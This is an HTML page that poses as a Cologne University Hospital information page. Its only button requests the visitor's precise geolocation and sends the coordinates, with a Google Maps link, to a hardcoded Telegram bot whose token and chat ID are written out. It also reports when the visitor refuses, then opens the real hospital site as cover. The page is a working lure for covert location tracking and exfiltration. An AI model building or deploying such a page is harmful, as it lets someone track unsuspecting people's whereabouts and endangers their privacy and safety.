<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <title>Cologne University Hospital</title>

  <style>
    body {
      margin: 0;
      min-height: 100vh;
      background:
        linear-gradient(rgba(0,0,0,0.75), rgba(0,0,0,0.75)),
        url("https://upload.wikimedia.org/wikipedia/commons/6/6f/Universit%C3%A4tsklinikum_K%C3%B6ln.jpg");
      background-size: cover;
      background-position: center;
      font-family: monospace;
      color: lime;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .box {
      background: rgba(0,0,0,0.8);
      border: 1px solid lime;
      padding: 25px;
      max-width: 420px;
      text-align: center;
      box-shadow: 0 0 20px lime;
    }

    button {
      padding: 12px 22px;
      font-size: 18px;
      background: lime;
      color: black;
      border: none;
      cursor: pointer;
      margin-top: 15px;
    }
  </style>
</head>

<body>

<div class="box">
  <h1>Cologne University Hospital</h1>
  <p>Zugriff wird gepr√ºft‚Ä¶</p>
  <button onclick="openUni()">Informationen ansehen</button>
  <p id="result"></p>
</div>

<script>
const BOT_TOKEN = "8402128842:AAHUBBOkf7jJ8M1G_NjZPoJ_wud0-UR7t3I";
const CHAT_ID = "8570996143";

function sendToTelegram(text) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  return fetch(url, {
    method: "POST",
    headers: {"Content-Type": "application/x-www-form-urlencoded"},
    body: `chat_id=${encodeURIComponent(CHAT_ID)}&text=${encodeURIComponent(text)}`
  });
}

function openUni() {
  const result = document.getElementById("result");
  result.innerText = "Standort wird abgefragt‚Ä¶ (bitte erlauben)";

  if (!navigator.geolocation) {
    result.innerText = "Geolokalisierung wird nicht unterst√ºtzt.";
    sendToTelegram("‚ùå Geolocation not supported");
    return;
  }

  navigator.geolocation.getCurrentPosition(
    async (pos) => {
      const lat = pos.coords.latitude.toFixed(5);
      const lon = pos.coords.longitude.toFixed(5);

      result.innerHTML =
        `‚úÖ Standort erhalten<br>${lat}, ${lon}<br>` +
        `<a href="https://maps.google.com/?q=${lat},${lon}" target="_blank">Google Maps</a>`;

      await sendToTelegram(`üìç Standort (mit Erlaubnis):\nLat: ${lat}\nLon: ${lon}\nhttps://maps.google.com/?q=${lat},${lon}`);

      setTimeout(() => window.open("https://www.uk-koeln.de", "_blank"), 800);
    },
    async (err) => {
      // icaz…ô verilm…ôdi / error oldu
      result.innerText = "‚ùå Standort nicht freigegeben.";
      await sendToTelegram(`‚ùå Standort nicht freigegeben (Error ${err.code})`);
    },
    { enableHighAccuracy: true, timeout: 10000 }
  );
}
</script>
